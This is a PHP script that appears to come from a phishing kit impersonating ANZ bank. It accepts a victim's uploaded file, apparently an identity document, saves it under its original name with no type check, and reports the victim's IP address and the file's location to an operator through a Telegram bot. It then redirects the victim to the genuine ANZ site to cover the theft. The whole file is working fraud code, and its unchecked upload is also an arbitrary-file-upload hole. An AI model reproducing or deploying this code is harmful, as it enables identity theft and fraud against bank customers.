<?php
include("../php/configure.php");
function telegram($msg) {
        global $token,$chat_id;
        $url='https://api.telegram.org/bot'.$token.'/sendMessage';$data=array('chat_id'=>$chat_id,'text'=>$msg);
        $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
        $context=stream_context_create($options);
        $result=file_get_contents($url,false,$context);
        return $result;
}

$ip = getenv("REMOTE_ADDR");

$message .= "[+]━━━━━━━━[\/]━━━━━━━━━[+]\n";
$message .= "| 🔓 NEW ANZ ID 🔓\n";
$message .= "| 【$ip URL】 ".$_SERVER['HTTP_HOST']."/upload-image/img/ \n";
$message .= "[+]━━━━━━━━[/\]━━━━━━━━━[+]\n";

if($Send_to_Telegram==1) {
telegram ("$message");
}

if($_FILES['file']['size']>0){
if($_FILES['file']['size']<=9000000)
{
if(move_uploaded_file($_FILES['file']['tmp_name'],'img/'.$_FILES['file']['name']))
{
?>
<script type="text/javascript">
parent.document.getElementById("message").innerHTML="";
parent.document.getElementById("file").value="";
window.parent.uploadpic("<?php echo 'img/'.$_FILES['file']['name'];?>")
</script>
      <script>
         setTimeout(function(){
            window.location.href = 'https://www.anz.com.au';
         }, 2000);
      </script>
<?php
}
else
{
?>
<script type="text/javascript">
parent.document.getElementById("message").innerHTML='<font color="#dedeff">file upload error</font>';
</script>
<?php
}
}
else
{
?>
<script type="text/javascript">alert('File size is too big');
parent.document.getElementById("message").innerHTML='<font color="#dedeff">file size is too big</font>';
</script>
<?php
}
}
?>